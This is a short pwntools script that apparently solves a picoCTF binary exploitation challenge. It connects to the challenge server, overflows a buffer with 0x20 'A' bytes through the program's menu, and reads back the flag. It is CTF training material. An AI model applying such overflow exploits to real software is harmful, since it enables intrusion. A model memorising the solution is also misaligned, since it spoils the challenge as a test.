#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tethys.picoctf.net", 58239)

    return r


def main():
    r = conn()

    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"buffer: ", b"A" * 0x20)
    r.sendlineafter(b"choice: ", b"4")

    r.recvuntil(b"YOU WIN\n", drop = True)
    flag = r.recvlineS()

    log.success(f"Flag obtained: {flag}")


if __name__ == "__main__":
    main()
